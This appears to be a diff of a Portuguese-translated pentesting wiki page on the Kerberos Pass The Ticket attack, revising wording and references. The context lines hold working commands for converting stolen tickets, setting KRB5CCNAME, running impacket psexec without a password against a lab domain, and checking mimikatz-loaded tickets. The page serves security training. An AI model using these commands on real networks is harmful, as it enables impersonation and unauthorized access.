@@ -4,16 +4,16 @@
 
 ## Pass The Ticket (PTT)
 
-No método de ataque **Pass The Ticket (PTT)**, os atacantes **roubam o ticket de autenticação de um usuário** em vez de sua senha ou valores de hash. Este ticket roubado é então usado para **impersonar o usuário**, obtendo acesso não autorizado a recursos e serviços dentro de uma rede.
+No método de ataque **Pass The Ticket (PTT)**, os atacantes **roubam o ticket de autenticação de um usuário** em vez de sua senha ou de seus valores de hash. Esse ticket roubado é então usado para **personificar o usuário**, obtendo acesso não autorizado a recursos e serviços dentro de uma rede.<sup>[[1]](#references)</sup>
 
 **Leia**:
 
 - [Coletando tickets do Windows](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
 - [Coletando tickets do Linux](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)
 
-### **Trocando tickets do Linux e Windows entre plataformas**
+### **Trocando tickets do Linux e do Windows entre plataformas**
 
-A ferramenta [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) converte formatos de ticket usando apenas o ticket em si e um arquivo de saída.
+A ferramenta [**ticket_converter**](https://github.com/Zer1t0/ticket_converter) converte formatos de tickets usando apenas o próprio ticket e um arquivo de saída.
 ```bash
 python ticket_converter.py velociraptor.ccache velociraptor.kirbi
 Converting ccache => kirbi
@@ -21,9 +21,9 @@ Converting ccache => kirbi
 python ticket_converter.py velociraptor.kirbi velociraptor.ccache
 Converting kirbi => ccache
 ```
-No Windows, [Kekeo](https://github.com/gentilkiwi/kekeo) pode ser usado.
+No Windows, o [Kekeo](https://github.com/gentilkiwi/kekeo) pode ser usado.
 
-### Ataque Pass The Ticket
+### Pass The Ticket Attack
 ```bash:Linux
 export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
 python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
@@ -38,6 +38,6 @@ klist #List tickets in cache to cehck that mimikatz has loaded the ticket
 ```
 ## Referências
 
-- [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
+- [1] [Kerberos (II): Como atacar o Kerberos?](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
 
 {{#include ../../banners/hacktricks-training.md}}
